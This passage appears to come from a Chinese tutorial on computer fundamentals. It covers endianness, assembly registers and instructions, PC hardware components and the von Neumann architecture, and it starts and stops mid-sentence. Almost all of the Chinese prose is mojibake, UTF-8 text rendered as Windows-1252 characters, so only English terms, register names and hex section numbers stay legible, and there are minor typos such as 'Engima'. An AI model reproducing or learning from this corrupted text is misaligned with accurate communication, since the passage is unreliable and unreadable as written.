uint32ï¼ˆæ— ç¬¦å·32ä½æ•´æ•°ï¼‰æˆ– uint64ï¼ˆæ— ç¬¦å·64ä½æ•´æ•°ï¼‰ï¼ŒæŒ‰é¡ºåºç»„åˆåœ¨ä¸€èµ·ã€‚ å¦‚æœæ˜¯å¤§ç«¯åºï¼Œç¬¬ä¸€ä¸ª u64 å°±æ˜¯è¿™ä¸ªæ•´æ•°æœ€å¤§çš„éƒ¨åˆ†ã€‚è¿ç®—æ—¶ï¼Œä¸€æ—¦è¿™ä¸ªæ•°å‘ç”Ÿå˜åŒ–ï¼Œéœ€è¦è¿›ä½ï¼Œåé¢çš„æ‰€æœ‰ä½éƒ½å¿…é¡»ç§»åŠ¨å’Œæ”¹å†™ã€‚å°ç«¯åºå‘ç”Ÿè¿›ä½æ—¶ï¼Œå¾€å¾€å°±ä¸éœ€è¦æ‰€æœ‰ä½ç§»åŠ¨ã€‚ å°ç«¯åºçš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå¦‚æœé€å­—èŠ‚çš„è¿ç®—ä»ä¸ªä½æ•°å¼€å§‹ï¼ˆæ¯”å¦‚ä¹˜æ³•å’ŒåŠ æ³•ï¼‰ï¼Œå¯ä»¥ä»å·¦åˆ°å³ä¾æ¬¡è¿ç®—ä¸€ä¸ªä¸ª u64ï¼Œç®—å®Œä¸Šä¸€ä¸ªå†è¯»å–ä¸‹ä¸€ä¸ªã€‚å¤§ç«¯åºå°±ä¸è¡Œï¼Œå¿…é¡»è¯»å–æ•´ä¸ªæ•°ä»¥åå†è¿›è¡Œè¿ç®—ã€‚ 9.8 æ›´æ”¹ç±»å‹ æœ€åä¸€ä¸ªä¾‹å­æ˜¯ï¼ŒC è¯­è¨€æœ‰ä¸€ç§ cast æ“ä½œï¼Œå¯ä»¥å¼ºåˆ¶æ”¹å˜å˜é‡çš„æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚æŠŠ32ä½æ•´æ•°å¼ºè¡Œæ”¹å˜ä¸º16ä½æ•´æ•°ã€‚ ä¸Šå›¾ä¸­ï¼Œ32ä½æ•´æ•°0x00000001æ›´æ”¹ä¸º16ä½æ•´æ•°0x0001ï¼Œå¤§ç«¯åºæ˜¯æˆªå»å‰é¢ä¸¤ä¸ªå­—èŠ‚ï¼Œè¿™æ—¶æŒ‡å‘è¿™ä¸ªåœ°å€çš„æŒ‡é’ˆå¿…é¡»å‘åç§»åŠ¨ä¸¤ä¸ªå­—èŠ‚ã€‚ å°ç«¯åºå°±æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œæˆªå»çš„æ˜¯åé¢ä¸¤ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸€ä½çš„åœ°å€æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æŒ‡é’ˆä¸éœ€è¦ç§»åŠ¨ã€‚ 9.9 æ€»ç»“ ç»¼ä¸Šæ‰€è¿°ï¼Œå¤§ç«¯åºå’Œå°ç«¯åºå„è‡ªçš„ä¼˜åŠ¿å¦‚ä¸‹ã€‚ å¦‚æœéœ€è¦é€ä½è¿ç®—ï¼Œæˆ–è€…éœ€è¦åˆ°ä»ä¸ªä½æ•°å¼€å§‹è¿ç®—ï¼Œéƒ½æ˜¯å°ç«¯åºå ä¼˜åŠ¿ã€‚åä¹‹ï¼Œå¦‚æœè¿ç®—åªæ¶‰åŠåˆ°é«˜ä½ï¼Œæˆ–è€…æ•°æ®çš„å¯è¯»æ€§æ¯”è¾ƒé‡è¦ï¼Œåˆ™æ˜¯å¤§ç«¯åºå ä¼˜åŠ¿ã€‚ 0x10 æ€»ç»“ æ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤çš„åŠ©è®°ç¬¦ï¼Œä¸æœºå™¨æŒ‡ä»¤æ˜¯ä¸€ä¸€å¯¹åº”çš„ AT&amp;Tçš„æ±‡ç¼–è¯­æ³•æ ¼å¼å’ŒIntelæ±‡ç¼–è¯­æ³•æ ¼å¼çš„æ˜¯ä¸åŒçš„ å¸¸ç”¨å¯„å­˜å™¨ï¼šEAX ã€EBXã€ECXã€EDXã€EDIã€ESIã€EBPã€ESP å­˜å–é€Ÿåº¦ä»é«˜åˆ°ä½åˆ†åˆ«æ˜¯: å¯„å­˜å™¨ &gt; 1çº§ç¼“å­˜ &gt; 2çº§ç¼“å­˜ &gt; 3çº§ç¼“å­˜ &gt; å†…å­˜ &gt; ç¡¬ç›˜ å¸¸ç”¨çš„æ±‡ç¼–æŒ‡ä»¤ï¼šmovã€jeã€jmpã€callã€addã€subã€incã€decã€andã€or 0x11 å†¯è¯ºä¾æ›¼ç»“æ„ä½“ç³» 11.1 è®¡ç®—æœºçš„åŸºæœ¬ç¡¬ä»¶ç»„æˆ æ—©å¹´ï¼Œè¦è‡ªå·±ç»„è£…ä¸€å°è®¡ç®—æœºï¼Œè¦å…ˆæœ‰ä¸‰å¤§ä»¶ï¼ŒCPUã€å†…å­˜å’Œä¸»æ¿ã€‚ åœ¨è¿™ä¸‰å¤§ä»¶ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆè¦è¯´çš„æ˜¯CPUï¼Œå®ƒæ˜¯è®¡ç®—æœºæœ€é‡è¦çš„æ ¸å¿ƒé…ä»¶ï¼Œå…¨åä½ è‚¯å®šçŸ¥é“ï¼Œå«ä¸­å¤®å¤„ç†å™¨ï¼ˆCentral Processing Unitï¼‰ã€‚ä¸ºä»€ä¹ˆè¯´ CPU æ˜¯â€œæœ€é‡è¦â€çš„å‘¢ï¼Ÿå› ä¸ºè®¡ç®—æœºçš„æ‰€æœ‰â€œè®¡ç®—â€éƒ½æ˜¯ç”± CPU æ¥è¿›è¡Œçš„ã€‚è‡ªç„¶ï¼ŒCPU ä¹Ÿæ˜¯æ•´å°è®¡ç®—æœºä¸­é€ ä»·æœ€æ˜‚è´µçš„éƒ¨åˆ†ä¹‹ä¸€ã€‚ CPU æ˜¯ä¸€ä¸ªè¶…çº§ç²¾ç»†çš„å°åˆ·ç”µè·¯ç‰ˆï¼Œå›¾ç‰‡æ¥æº ç¬¬äºŒä¸ªé‡è¦çš„é…ä»¶ï¼Œå°±æ˜¯å†…å­˜ï¼ˆMemoryï¼‰ã€‚ä½ æ’°å†™çš„ç¨‹åºã€æ‰“å¼€çš„æµè§ˆå™¨ã€è¿è¡Œçš„æ¸¸æˆï¼Œéƒ½è¦åŠ è½½åˆ°å†…å­˜é‡Œæ‰èƒ½è¿è¡Œã€‚ç¨‹åºè¯»å–çš„æ•°æ®ã€è®¡ç®—å¾—åˆ°çš„ç»“æœï¼Œä¹Ÿéƒ½è¦æ”¾åœ¨å†…å­˜é‡Œã€‚å†…å­˜è¶Šå¤§ï¼Œèƒ½åŠ è½½çš„ä¸œè¥¿è‡ªç„¶ä¹Ÿå°±è¶Šå¤šã€‚ å†…å­˜é€šå¸¸ç›´æ¥å¯ä»¥æ’åœ¨ä¸»æ¿ä¸Šï¼Œå›¾ç‰‡æ¥æº å­˜æ”¾åœ¨å†…å­˜é‡Œçš„ç¨‹åºå’Œæ•°æ®ï¼Œéœ€è¦è¢« CPU è¯»å–ï¼ŒCPU è®¡ç®—å®Œä¹‹åï¼Œè¿˜è¦æŠŠæ•°æ®å†™å›åˆ°å†…å­˜ã€‚ç„¶è€Œ CPU ä¸èƒ½ç›´æ¥æ’åˆ°å†…å­˜ä¸Šï¼Œåä¹‹äº¦ç„¶ã€‚äºæ˜¯ï¼Œå°±å¸¦æ¥äº†æœ€åä¸€ä¸ªå¤§ä»¶â€”â€”ä¸»æ¿ï¼ˆMotherboardï¼‰ã€‚ ä¸»æ¿æ˜¯ä¸€ä¸ªæœ‰ç€å„ç§å„æ ·ï¼Œæœ‰æ—¶å€™å¤šè¾¾æ•°åä¹ƒè‡³ä¸Šç™¾ä¸ªæ’æ§½çš„é…ä»¶ã€‚æˆ‘ä»¬çš„ CPU è¦æ’åœ¨ä¸»æ¿ä¸Šï¼Œå†…å­˜ä¹Ÿè¦æ’åœ¨ä¸»æ¿ä¸Šã€‚ä¸»æ¿çš„èŠ¯ç‰‡ç»„ï¼ˆChipsetï¼‰å’Œæ€»çº¿ï¼ˆBusï¼‰è§£å†³äº† CPU å’Œå†…å­˜ä¹‹é—´å¦‚ä½•é€šä¿¡çš„é—®é¢˜ã€‚èŠ¯ç‰‡ç»„æ§åˆ¶äº†æ•°æ®ä¼ è¾“çš„æµè½¬ï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä»å“ªé‡Œåˆ°å“ªé‡Œçš„é—®é¢˜ã€‚æ€»çº¿åˆ™æ˜¯å®é™…æ•°æ®ä¼ è¾“çš„é«˜é€Ÿå…¬è·¯ã€‚å› æ­¤ï¼Œæ€»çº¿é€Ÿåº¦ï¼ˆBus Speedï¼‰å†³å®šäº†æ•°æ®èƒ½ä¼ è¾“å¾—å¤šå¿«ã€‚ è®¡ç®—æœºä¸»æ¿ä¸Šé€šå¸¸æœ‰ç€å„ç§å„æ ·çš„æ’æ§½ï¼Œå›¾ç‰‡æ¥æº æœ‰äº†ä¸‰å¤§ä»¶ï¼Œåªè¦é…ä¸Šç”µæºä¾›ç”µï¼Œè®¡ç®—æœºå·®ä¸å¤šå°±å¯ä»¥è·‘èµ·æ¥äº†ã€‚ä½†æ˜¯ç°åœ¨è¿˜ç¼ºå°‘å„ç±»è¾“å…¥ï¼ˆInputï¼‰/ è¾“å‡ºï¼ˆOutputï¼‰è®¾å¤‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„I/O è®¾å¤‡ã€‚å¦‚æœä½ ç”¨çš„æ˜¯è‡ªå·±çš„ä¸ªäººç”µè„‘ï¼Œé‚£æ˜¾ç¤ºå™¨è‚¯å®šå¿…ä¸å¯å°‘ï¼Œåªæœ‰æœ‰äº†æ˜¾ç¤ºå™¨æˆ‘ä»¬æ‰èƒ½çœ‹åˆ°è®¡ç®—æœºè¾“å‡ºçš„å„ç§å›¾åƒã€æ–‡å­—ï¼Œè¿™ä¹Ÿå°±æ˜¯æ‰€è°“çš„è¾“å‡ºè®¾å¤‡ã€‚ åŒæ ·çš„ï¼Œé¼ æ ‡å’Œé”®ç›˜ä¹Ÿéƒ½æ˜¯å¿…ä¸å¯å°‘çš„é…ä»¶ã€‚è¿™æ ·æˆ‘æ‰èƒ½è¾“å…¥æ–‡æœ¬ï¼Œå†™ä¸‹è¿™ç¯‡æ–‡ç« ã€‚å®ƒä»¬ä¹Ÿå°±æ˜¯æ‰€è°“çš„è¾“å…¥è®¾å¤‡ã€‚ æœ€åï¼Œä½ è‡ªå·±é…çš„ä¸ªäººè®¡ç®—æœºï¼Œè¿˜è¦é…ä¸Šä¸€ä¸ªç¡¬ç›˜ã€‚è¿™æ ·å„ç§æ•°æ®æ‰èƒ½æŒä¹…åœ°ä¿å­˜ä¸‹æ¥ã€‚ç»å¤§éƒ¨åˆ†äººéƒ½ä¼šç»™è‡ªå·±çš„æœºå™¨è£…ä¸Šä¸€ä¸ªæœºç®±ï¼Œé…ä¸Šé£æ‰‡ï¼Œè§£å†³ç°å°˜å’Œæ•£çƒ­çš„é—®é¢˜ã€‚ä¸è¿‡æœºç®±å’Œé£æ‰‡ï¼Œç®—ä¸ä¸Šæ˜¯è®¡ç®—æœºçš„å¿…å¤‡ç¡¬ä»¶ï¼Œæˆ‘ä»¬æ‹¿ä¸ªçº¸æ¿æˆ–è€…å¤–é¢æ”¾ä¸ªç”µé£æ‰‡ï¼Œä¹Ÿä¸€æ ·èƒ½ç”¨ã€‚ è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®ä½ åº”è¯¥æœ‰æ„Ÿè§‰äº†ï¼Œæ˜¾ç¤ºå™¨ã€é¼ æ ‡ã€é”®ç›˜å’Œç¡¬ç›˜è¿™äº›ä¸œè¥¿å¹¶ä¸æ˜¯ä¸€å°è®¡ç®—æœºå¿…é¡»çš„éƒ¨åˆ†ã€‚ä½ æƒ³ä¸€æƒ³ï¼Œæˆ‘ä»¬å…¶å®åªéœ€è¦æœ‰ I/O è®¾å¤‡ï¼Œèƒ½è®©æˆ‘ä»¬ä»è®¡ç®—æœºé‡Œè¾“å…¥å’Œè¾“å‡ºä¿¡æ¯ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥äº†ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ã€‚ ä½ è‚¯å®šå»è¿‡ç½‘å§å§ï¼Ÿä¸çŸ¥é“ä½ æ³¨æ„åˆ°æ²¡æœ‰ï¼Œå¾ˆå¤šç½‘å§çš„è®¡ç®—æœºå°±æ²¡æœ‰ç¡¬ç›˜ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡å±€åŸŸç½‘ï¼Œè¯»å†™è¿œç¨‹ç½‘ç»œç¡¬ç›˜é‡Œé¢çš„æ•°æ®ã€‚æˆ‘ä»¬æ—¥å¸¸ç”¨çš„å„ç±»äº‘æœåŠ¡å™¨ï¼Œåªè¦è®©è®¡ç®—æœºèƒ½é€šè¿‡ç½‘ç»œï¼ŒSSH è¿œç¨‹ç™»é™†è®¿é—®å°±å¥½äº†ï¼Œå› æ­¤ä¹Ÿæ²¡å¿…è¦é…æ˜¾ç¤ºå™¨ã€é¼ æ ‡ã€é”®ç›˜è¿™äº›ä¸œè¥¿ã€‚è¿™æ ·ä¸ä»…èƒ½å¤ŸèŠ‚çº¦æˆæœ¬ï¼Œè¿˜æ›´æ–¹ä¾¿ç»´æŠ¤ã€‚ è¿˜æœ‰ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„è®¾å¤‡ï¼Œå°±æ˜¯æ˜¾å¡ï¼ˆGraphics Cardï¼‰ã€‚ç°åœ¨ï¼Œä½¿ç”¨å›¾å½¢ç•Œé¢æ“ä½œç³»ç»Ÿçš„è®¡ç®—æœºï¼Œæ— è®ºæ˜¯ Windowsã€Mac OS è¿˜æ˜¯ Linuxï¼Œæ˜¾å¡éƒ½æ˜¯å¿…ä¸å¯å°‘çš„ã€‚æœ‰äººå¯èƒ½è¦è¯´äº†ï¼Œæˆ‘è£…æœºçš„æ—¶å€™æ²¡æœ‰ä¹°æ˜¾å¡ï¼Œè®¡ç®—æœºä¸€æ ·å¯ä»¥æ­£å¸¸è·‘èµ·æ¥å•Šï¼é‚£æ˜¯å› ä¸ºï¼Œç°åœ¨çš„ä¸»æ¿éƒ½å¸¦äº†å†…ç½®çš„æ˜¾å¡ã€‚å¦‚æœä½ ç”¨è®¡ç®—æœºç©æ¸¸æˆï¼Œåšå›¾å½¢æ¸²æŸ“æˆ–è€…è·‘æ·±åº¦å­¦ä¹ åº”ç”¨ï¼Œä½ å¤šåŠå°±éœ€è¦ä¹°ä¸€å¼ å•ç‹¬çš„æ˜¾å¡ï¼Œæ’åœ¨ä¸»æ¿ä¸Šã€‚æ˜¾å¡ä¹‹æ‰€ä»¥ç‰¹æ®Šï¼Œæ˜¯å› ä¸ºæ˜¾å¡é‡Œæœ‰é™¤äº† CPU ä¹‹å¤–çš„å¦ä¸€ä¸ªâ€œå¤„ç†å™¨â€ï¼Œä¹Ÿå°±æ˜¯GPUï¼ˆGraphics Processing Unitï¼Œå›¾å½¢å¤„ç†å™¨ï¼‰ï¼ŒGPU ä¸€æ ·å¯ä»¥åšå„ç§â€œè®¡ç®—â€çš„å·¥ä½œã€‚ é¼ æ ‡ã€é”®ç›˜ä»¥åŠç¡¬ç›˜ï¼Œè¿™äº›éƒ½æ˜¯æ’åœ¨ä¸»æ¿ä¸Šçš„ã€‚ä½œä¸ºå¤–éƒ¨ I/O è®¾å¤‡ï¼Œå®ƒä»¬æ˜¯é€šè¿‡ä¸»æ¿ä¸Šçš„å—æ¡¥ï¼ˆSouthBridgeï¼‰èŠ¯ç‰‡ç»„ï¼Œæ¥æ§åˆ¶å’Œ CPU ä¹‹é—´çš„é€šä¿¡çš„ã€‚â€œå—æ¡¥â€èŠ¯ç‰‡çš„åå­—å¾ˆç›´è§‚ï¼Œä¸€æ–¹é¢ï¼Œå®ƒåœ¨ä¸»æ¿ä¸Šçš„ä½ç½®ï¼Œé€šå¸¸åœ¨ä¸»æ¿çš„â€œå—é¢â€ã€‚å¦ä¸€æ–¹é¢ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯ä½œä¸ºâ€œæ¡¥â€ï¼Œæ¥è¿æ¥é¼ æ ‡ã€é”®ç›˜ä»¥åŠç¡¬ç›˜è¿™äº›å¤–éƒ¨è®¾å¤‡å’Œ CPU ä¹‹é—´çš„é€šä¿¡ã€‚ æœ‰äº†å—æ¡¥ï¼Œè‡ªç„¶å¯¹åº”ç€ä¹Ÿæœ‰â€œåŒ—æ¡¥â€ã€‚æ˜¯çš„ï¼Œä»¥å‰çš„ä¸»æ¿ä¸Šé€šå¸¸ä¹Ÿæœ‰â€œåŒ—æ¡¥â€èŠ¯ç‰‡ï¼Œç”¨æ¥ä½œä¸ºâ€œæ¡¥â€ï¼Œè¿æ¥ CPU å’Œå†…å­˜ã€æ˜¾å¡ä¹‹é—´çš„é€šä¿¡ã€‚ä¸è¿‡ï¼Œéšç€æ—¶é—´çš„å˜è¿ï¼Œç°åœ¨çš„ä¸»æ¿ä¸Šçš„â€œåŒ—æ¡¥â€èŠ¯ç‰‡çš„å·¥ä½œï¼Œå·²ç»è¢«ç§»åˆ°äº† CPU çš„å†…éƒ¨ï¼Œæ‰€ä»¥ä½ åœ¨ä¸»æ¿ä¸Šï¼Œå·²ç»çœ‹ä¸åˆ°åŒ—æ¡¥èŠ¯ç‰‡äº†ã€‚ 11.2 å†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æ„ åˆšæ‰æˆ‘ä»¬è®²äº†ä¸€å°è®¡ç®—æœºçš„ç¡¬ä»¶ç»„æˆï¼Œè¿™è¯´çš„æ˜¯æˆ‘ä»¬å¹³æ—¶ç”¨çš„ä¸ªäººç”µè„‘æˆ–è€…æœåŠ¡å™¨ã€‚é‚£æˆ‘ä»¬å¹³æ—¶æœ€å¸¸ç”¨çš„æ™ºèƒ½æ‰‹æœºçš„ç»„æˆï¼Œä¹Ÿæ˜¯è¿™æ ·å—ï¼Ÿ æˆ‘ä»¬æ‰‹æœºé‡Œåªæœ‰ SD å¡ï¼ˆSecure Digital Memory Cardï¼‰è¿™æ ·ç±»ä¼¼ç¡¬ç›˜åŠŸèƒ½çš„å­˜å‚¨å¡æ’æ§½ï¼Œå¹¶æ²¡æœ‰å†…å­˜æ’æ§½ã€CPU æ’æ§½è¿™äº›ä¸œè¥¿ã€‚æ²¡é”™ï¼Œå› ä¸ºæ‰‹æœºå°ºå¯¸çš„åŸå› ï¼Œæ‰‹æœºåˆ¶é€ å•†ä»¬é€‰æ‹©æŠŠ CPUã€å†…å­˜ã€ç½‘ç»œé€šä¿¡ï¼Œä¹ƒè‡³æ‘„åƒå¤´èŠ¯ç‰‡ï¼Œéƒ½å°è£…åˆ°ä¸€ä¸ªèŠ¯ç‰‡ï¼Œç„¶åå†åµŒå…¥åˆ°æ‰‹æœºä¸»æ¿ä¸Šã€‚è¿™ç§æ–¹å¼å«SoCï¼Œä¹Ÿå°±æ˜¯ System on a Chipï¼ˆç³»ç»ŸèŠ¯ç‰‡ï¼‰ã€‚ è¿™æ ·çœ‹èµ·æ¥ï¼Œä¸ªäººç”µè„‘å’Œæ™ºèƒ½æ‰‹æœºçš„ç¡¬ä»¶ç»„æˆæ–¹å¼ä¸å¤ªä¸€æ ·ã€‚å¯æ˜¯ï¼Œæˆ‘ä»¬å†™æ™ºèƒ½æ‰‹æœºä¸Šçš„ Appï¼Œå’Œå†™ä¸ªäººç”µè„‘çš„å®¢æˆ·ç«¯åº”ç”¨ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œéƒ½æ˜¯é€šè¿‡â€œé«˜çº§è¯­è¨€â€è¿™æ ·çš„ç¼–ç¨‹è¯­è¨€æ’°å†™ã€ç¼–è¯‘ä¹‹åï¼Œä¸€æ ·æ˜¯æŠŠä»£ç å’Œæ•°æ®åŠ è½½åˆ°å†…å­˜é‡Œæ¥æ‰§è¡Œã€‚è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºï¼Œæ— è®ºæ˜¯ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ã€æ™ºèƒ½æ‰‹æœºï¼Œè¿˜æ˜¯ Raspberry Pi è¿™æ ·çš„å¾®å‹å¡ç‰‡æœºï¼Œéƒ½éµå¾ªç€åŒä¸€ä¸ªâ€œè®¡ç®—æœºâ€çš„æŠ½è±¡æ¦‚å¿µã€‚è¿™æ˜¯æ€ä¹ˆæ ·ä¸€ä¸ªâ€œè®¡ç®—æœºâ€å‘¢ï¼Ÿè¿™å…¶å®å°±æ˜¯ï¼Œè®¡ç®—æœºç¥–å¸ˆçˆ·ä¹‹ä¸€å†¯Â·è¯ºä¾æ›¼ï¼ˆJohn von Neumannï¼‰æå‡ºçš„å†¯Â·è¯ºä¾æ›¼ä½“ç³»ç»“æ„ï¼ˆVon Neumann architectureï¼‰ï¼Œä¹Ÿå«å­˜å‚¨ç¨‹åºè®¡ç®—æœºã€‚ ä»€ä¹ˆæ˜¯å­˜å‚¨ç¨‹åºè®¡ç®—æœºå‘¢ï¼Ÿè¿™é‡Œé¢å…¶å®æš—å«äº†ä¸¤ä¸ªæ¦‚å¿µï¼Œä¸€ä¸ªæ˜¯â€œå¯ç¼–ç¨‹â€è®¡ç®—æœºï¼Œä¸€ä¸ªæ˜¯â€œå­˜å‚¨â€è®¡ç®—æœºã€‚ è¯´åˆ°â€œå¯ç¼–ç¨‹â€ï¼Œä¼°è®¡ä½ ä¼šæœ‰ç‚¹æ‡µï¼Œä½ å¯ä»¥å…ˆæƒ³æƒ³ï¼Œä»€ä¹ˆæ˜¯â€œä¸å¯ç¼–ç¨‹â€ã€‚è®¡ç®—æœºæ˜¯ç”±å„ç§é—¨ç”µè·¯ç»„åˆè€Œæˆçš„ï¼Œç„¶åé€šè¿‡ç»„è£…å‡ºä¸€ä¸ªå›ºå®šçš„ç”µè·¯ç‰ˆï¼Œæ¥å®Œæˆä¸€ä¸ªç‰¹å®šçš„è®¡ç®—ç¨‹åºã€‚ä¸€æ—¦éœ€è¦ä¿®æ”¹åŠŸèƒ½ï¼Œå°±è¦é‡æ–°ç»„è£…ç”µè·¯ã€‚è¿™æ ·çš„è¯ï¼Œè®¡ç®—æœºå°±æ˜¯â€œä¸å¯ç¼–ç¨‹â€çš„ï¼Œå› ä¸ºç¨‹åºåœ¨è®¡ç®—æœºç¡¬ä»¶å±‚é¢æ˜¯â€œå†™æ­»â€çš„ã€‚æœ€å¸¸è§çš„å°±æ˜¯è€å¼è®¡ç®—å™¨ï¼Œç”µè·¯æ¿è®¾å¥½äº†åŠ å‡ä¹˜é™¤ï¼Œåšä¸äº†ä»»ä½•è®¡ç®—é€»è¾‘å›ºå®šä¹‹å¤–çš„äº‹æƒ…ã€‚ è®¡ç®—å™¨çš„æœ¬è´¨æ˜¯ä¸€ä¸ªä¸å¯ç¼–ç¨‹çš„è®¡ç®—æœºï¼Œå›¾ç‰‡æ¥æº æˆ‘ä»¬å†æ¥çœ‹â€œå­˜å‚¨â€è®¡ç®—æœºã€‚è¿™å…¶å®æ˜¯è¯´ï¼Œç¨‹åºæœ¬èº«æ˜¯å­˜å‚¨åœ¨è®¡ç®—æœºçš„å†…å­˜é‡Œï¼Œå¯ä»¥é€šè¿‡åŠ è½½ä¸åŒçš„ç¨‹åºæ¥è§£å†³ä¸åŒçš„é—®é¢˜ã€‚æœ‰â€œå­˜å‚¨ç¨‹åºè®¡ç®—æœºâ€ï¼Œè‡ªç„¶ä¹Ÿæœ‰ä¸èƒ½å­˜å‚¨ç¨‹åºçš„è®¡ç®—æœºã€‚å…¸å‹çš„å°±æ˜¯æ—©å¹´çš„â€œPlugboardâ€è¿™æ ·çš„æ’çº¿æ¿å¼çš„è®¡ç®—æœºã€‚æ•´ä¸ªè®¡ç®—æœºå°±æ˜¯ä¸€ä¸ªå·¨å¤§çš„æ’çº¿æ¿ï¼Œé€šè¿‡åœ¨æ¿å­ä¸Šä¸åŒçš„æ’å¤´æˆ–è€…æ¥å£çš„ä½ç½®æ’å…¥çº¿è·¯ï¼Œæ¥å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚è¿™æ ·çš„è®¡ç®—æœºè‡ªç„¶æ˜¯â€œå¯ç¼–ç¨‹â€çš„ï¼Œä½†æ˜¯ç¼–å†™å¥½çš„ç¨‹åºä¸èƒ½å­˜å‚¨ä¸‹æ¥ä¾›ä¸‹ä¸€æ¬¡åŠ è½½ä½¿ç”¨ï¼Œä¸å¾—ä¸æ¯æ¬¡è¦ç”¨åˆ°å’Œå½“å‰ä¸åŒçš„â€œç¨‹åºâ€çš„æ—¶å€™ï¼Œé‡æ–°æ’æ¿å­ï¼Œé‡æ–°â€œç¼–ç¨‹â€ã€‚ è‘—åçš„Engima Machineå°±ç”¨åˆ°äº† Plugboard æ¥è¿›è¡Œâ€œç¼–ç¨‹â€ï¼Œå›¾ç‰‡æ¥æº å¯ä»¥çœ‹åˆ°ï¼Œæ— è®ºæ˜¯â€œä¸å¯ç¼–ç¨‹â€è¿˜æ˜¯â€œä¸å¯å­˜å‚¨â€ï¼Œéƒ½ä¼šè®©ä½¿ç”¨è®¡ç®—æœºçš„æ•ˆç‡å¤§å¤§ä¸‹é™ã€‚è€Œè¿™ä¸ªå¯¹äºæ•ˆç‡çš„è¿½æ±‚ï¼Œä¹Ÿå°±æ˜¯â€œå­˜å‚¨ç¨‹åºè®¡ç®—æœºâ€çš„ç”±æ¥ã€‚ äºæ˜¯æˆ‘ä»¬çš„å†¯ç¥–å¸ˆçˆ·ï¼ŒåŸºäºå½“æ—¶åœ¨ç§˜å¯†å¼€å‘çš„ EDVAC å†™äº†ä¸€ç¯‡æŠ¥å‘ŠFirst Draft of a Report on the EDVACï¼Œæè¿°äº†ä»–å¿ƒç›®ä¸­çš„ä¸€å°è®¡ç®—æœºåº”è¯¥é•¿ä»€ä¹ˆæ ·ã€‚è¿™ç¯‡æŠ¥å‘Šåœ¨å†å²ä¸Šæœ‰ä¸ªå¾ˆç‰¹æ®Šçš„ç®€ç§°ï¼Œå«First Draftï¼Œç¿»è¯‘æˆä¸­æ–‡ï¼Œå…¶å®å°±æ˜¯ã€Šç¬¬ä¸€ä»½è‰æ¡ˆã€‹ã€‚è¿™æ ·ï¼Œç°ä»£è®¡ç®—æœºçš„å‘å±•å°±ä»ç¥–å¸ˆçˆ·å†™çš„ä¸€ä»½è‰æ¡ˆå¼€å§‹äº†ã€‚ First Drafté‡Œé¢è¯´äº†ä¸€å°è®¡ç®—æœºåº”è¯¥æœ‰å“ªäº›éƒ¨åˆ†ç»„æˆï¼Œæˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹ã€‚ é¦–å…ˆæ˜¯ä¸€ä¸ªåŒ…å«ç®—æœ¯é€»è¾‘å•å…ƒï¼ˆArithmetic Logic Unitï¼ŒALUï¼‰å’Œå¤„ç†å™¨å¯„å­˜å™¨ï¼ˆProcessor Registerï¼‰çš„å¤„ç†å™¨å•å…ƒï¼ˆProcessing Unitï¼‰ï¼Œç”¨æ¥å®Œæˆå„ç§ç®—æœ¯å’Œé€»è¾‘è¿ç®—ã€‚å› ä¸ºå®ƒèƒ½å¤Ÿå®Œæˆå„ç§æ•°æ®çš„å¤„ç†æˆ–è€…è®¡ç®—å·¥ä½œï¼Œå› æ­¤ä¹Ÿæœ‰äººæŠŠè¿™ä¸ªå«ä½œæ•°æ®é€šè·¯ï¼ˆDatapathï¼‰æˆ–è€…è¿ç®—å™¨ã€‚ ç„¶åæ˜¯ä¸€ä¸ªåŒ…å«æŒ‡ä»¤å¯„å­˜å™¨ï¼ˆInstruction Reigsterï¼‰å’Œç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counterï¼‰çš„æ§åˆ¶å™¨å•å…ƒï¼ˆControl Unit/CUï¼‰ï¼Œç”¨æ¥æ§åˆ¶ç¨‹åºçš„æµç¨‹ï¼Œé€šå¸¸å°±æ˜¯ä¸åŒæ¡ä»¶ä¸‹çš„åˆ†æ”¯å’Œè·³è½¬ã€‚åœ¨ç°åœ¨çš„è®¡ç®—æœºé‡Œï¼Œä¸Šé¢çš„ç®—æœ¯é€»è¾‘å•å…ƒå’Œè¿™é‡Œçš„æ§åˆ¶å™¨å•å…ƒï¼Œå…±åŒç»„æˆäº†æˆ‘ä»¬è¯´çš„ CPUã€‚ æ¥ç€æ˜¯ç”¨æ¥å­˜å‚¨æ•°æ®ï¼ˆDataï¼‰å’ŒæŒ‡ä»¤ï¼ˆInstructionï¼‰çš„å†…å­˜ã€‚ä»¥åŠæ›´å¤§å®¹é‡çš„å¤–éƒ¨å­˜å‚¨ï¼Œåœ¨è¿‡å»ï¼Œå¯èƒ½æ˜¯ç£å¸¦ã€ç£é¼“è¿™æ ·çš„è®¾å¤‡ï¼Œç°åœ¨é€šå¸¸å°±æ˜¯ç¡¬ç›˜ã€‚ æœ€åå°±æ˜¯å„ç§è¾“å…¥å’Œè¾“å‡ºè®¾å¤‡ï¼Œä»¥åŠå¯¹åº”çš„è¾“å…¥å’Œè¾“å‡ºæœºåˆ¶ã€‚æˆ‘ä»¬ç°åœ¨æ— è®ºæ˜¯ä½¿ç”¨ä»€ä¹ˆæ ·çš„è®¡ç®—æœºï¼Œå…¶å®éƒ½æ˜¯å’Œè¾“å…¥è¾“å‡ºè®¾å¤‡åœ¨æ‰“äº¤é“ã€‚ä¸ªäººç”µè„‘çš„é¼ æ 